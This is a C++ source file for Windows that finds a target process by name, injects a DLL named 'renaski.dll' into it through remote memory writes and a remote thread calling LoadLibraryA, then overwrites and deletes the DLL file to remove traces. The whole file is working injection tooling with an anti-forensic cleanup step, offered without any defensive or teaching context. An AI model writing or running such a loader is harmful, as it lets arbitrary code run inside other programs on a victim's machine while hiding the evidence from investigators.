#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <filesystem>
#include <fstream>
#include <vector>

void secureDelete(const std::string& filePath) {
    if (std::filesystem::exists(filePath)) {
        std::fstream file(filePath, std::ios::in | std::ios::out);
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            std::size_t fileSize = file.tellg();
            file.seekp(0, std::ios::beg);

            std::vector<char> overwriteData(fileSize, 0);
            file.write(overwriteData.data(), fileSize);
            file.flush();
            file.close();
        }
        std::filesystem::remove(filePath);
    }
}

DWORD getProcessID(const std::string& processName) {
    DWORD processID = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                    processID = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return processID;
}
bool injectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open target process." << std::endl;
        return false;
    }

    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pDllPath == NULL) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}
std::string getExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    std::string::size_type pos = std::string(path).find_last_of("\\/");
    return std::string(path).substr(0, pos);
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <process_name>" << std::endl;
        return 1;
    }
    const char* processName = argv[1];
    std::string exePath = getExecutablePath();
    std::string dllPath = exePath + "\\renaski.dll";
    DWORD pid = getProcessID(processName);
    if (pid == 0) {
        std::cerr << "Could not find process: " << processName << std::endl;
        return 1;
    }
    if (injectDLL(pid, dllPath.c_str())) {
        std::cout << "DLL injected successfully." << std::endl;
        secureDelete(dllPath);
    } else {
        std::cerr << "DLL injection failed." << std::endl;
        return 1;
    }

    return 0;
}


